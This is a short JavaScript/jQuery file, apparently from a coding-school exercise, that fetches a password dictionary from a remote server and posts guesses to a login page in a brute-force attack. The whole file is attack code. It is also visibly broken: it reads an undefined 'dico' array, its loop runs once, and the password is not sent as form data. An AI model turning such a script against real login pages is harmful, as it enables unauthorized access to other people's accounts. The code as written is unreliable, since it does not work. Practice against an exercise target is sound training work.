
var passwordd=[];
var resultat={};

$.ajax({
	url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt",
	complete: function(result){
		passwordd = result.responseText.split("\n");
	}
});

$(document).ajaxComplete(function(){
	
	for (var i = 0; i < 1; i++) {
		testPassword(dico[i]);
	}
	
	testPassword(dico[0]);
});

function testPassword(passwd){
	$.ajax({
		url: "http://docusland.fr/code-academie/js_bruteforce/index.php",
		type: "POST",
		password: passwd,
		complete: function(result){
			resultat[passwd] = result;
		}
	});
}
